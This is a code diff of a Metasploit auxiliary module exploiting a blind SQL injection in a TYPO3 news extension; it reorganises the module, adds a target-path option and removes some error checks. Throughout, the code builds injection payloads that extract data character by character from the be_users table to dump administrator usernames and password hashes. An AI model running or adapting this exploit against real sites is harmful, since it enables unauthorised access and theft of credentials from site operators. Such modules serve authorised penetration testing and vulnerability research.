@@ -28,8 +28,8 @@ class MetasploitModule < Msf::Auxiliary
       'License'        => MSF_LICENSE,
       'Author'         =>
         [
-          'Charles Fol', # initial discovery, POC
-          'Marco Rivoli <marco.rivoli.nvh<at>gmail.com>' #MSF code
+          'Marco Rivoli', #MSF code
+          'Charles Fol' # initial discovery, POC
         ],
       'References'     =>
         [
@@ -45,6 +45,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_options(
       [
+        OptString.new('TARGETURI', [true, 'The path of TYPO3', '/typo3/']),
         OptString.new('ID', [true, 'The id of TYPO3 news page', '1']),
         OptString.new('PATTERN1', [false, 'Pattern of the first article title', 'Article #1']),
         OptString.new('PATTERN2', [false, 'Pattern of the second article title', 'Article #2'])
@@ -58,29 +59,6 @@ class MetasploitModule < Msf::Auxiliary
     else
       return Exploit::CheckCode::Safe
     end
-  end
-
-  def test_injection()
-    pattern1, pattern2 = try_autodetect_patterns
-    if pattern1 == '' or pattern2 == ''
-      print_error("Impossible to determine pattern automatically, aborting...")
-      return false
-    end
-    print_status("Testing injection...")
-    offset = 9
-    field = 'username'
-    table = 'be_users'
-    condition = 'uid=1'
-    digit_charset = "0".upto("9").to_a.join('')
-    patterns = {:pattern1 => pattern1, :pattern2 => pattern2}
-    size = blind_size(
-      "length(#{field})+#{offset}",
-      table,
-      condition,
-      2,
-      digit_charset,
-      patterns)
-    return size != ''
   end
 
   def dump_the_hash(patterns = {})
@@ -115,20 +93,21 @@ class MetasploitModule < Msf::Auxiliary
      charset,
      patterns
     )
+    return data
   end
 
   def select_position(field, table, condition, position, char)
     payload1 = "select(#{field})from(#{table})where(#{condition})"
     payload2 = "ord(substring((#{payload1})from(#{position})for(1)))"
     payload3 = "uid*(case((#{payload2})=#{char.ord})when(1)then(1)else(-1)end)"
+    return payload3
   end
 
   def blind_size(field, table, condition, size, charset,  patterns = {})
-    vprint_status("Retrieving field '#{field}' string (#{size} bytes) ...")
     str = ""
-    (1..size).each do |position|
-      charset.split('').each do |char|
-        payload = select_position(field, table, condition, position, char)
+    for position in 0..size
+      for char in charset.split('')
+        payload = select_position(field, table, condition, position + 1, char)
         #print_status(payload)
         if test(payload, patterns)
           str += char.to_s
@@ -137,7 +116,7 @@ class MetasploitModule < Msf::Auxiliary
         end
       end
     end
-    str
+    return str
   end
 
   def test(payload, patterns = {})
@@ -159,7 +138,7 @@ class MetasploitModule < Msf::Auxiliary
     return res.body.index(patterns[:pattern1]) < res.body.index(patterns[:pattern2])
   end
 
-  def try_autodetect_patterns
+  def try_autodetect_patterns()
     print_status("Trying to automatically determine Pattern1 and Pattern2...")
     res = send_request_cgi({
       'method'   => 'POST',
@@ -169,20 +148,19 @@ class MetasploitModule < Msf::Auxiliary
         'no_cache' => '1'
        }
     })
-    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]')
-    if news.empty? or news.length < 2
-      print_error("No enough news found on the page with specified id (at least 2 news are necessary)")
-      return '',''
-    end
+    news = res.get_html_document.search('div[@itemtype="http://schema.org/Article"]');
     pattern1 = defined?(news[0]) ? news[0].search('span[@itemprop="headline"]').text : ''
     pattern2 = defined?(news[1]) ? news[1].search('span[@itemprop="headline"]').text : ''
-    if pattern1.to_s.eql?('') || pattern2.to_s.eql?('')
-      print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user specified values...")
+    if pattern1 != '' and pattern2 != ''
+      print_status("Pattern1: #{pattern1}")
+      print_status("Pattern2: #{pattern2}")
+    else
+      print_status("Couldn't determine Pattern1 and Pattern2 automatically, switching to user speficied values...")
       pattern1 = datastore['PATTERN1']
       pattern2 = datastore['PATTERN2']
+      print_status("Pattern1: #{pattern1}")
+      print_status("Pattern2: #{pattern2}")
     end
-    print_status("Pattern #1: #{pattern1}")
-    print_status("Pattern #2: #{pattern2}")
     return pattern1, pattern2
   end
 
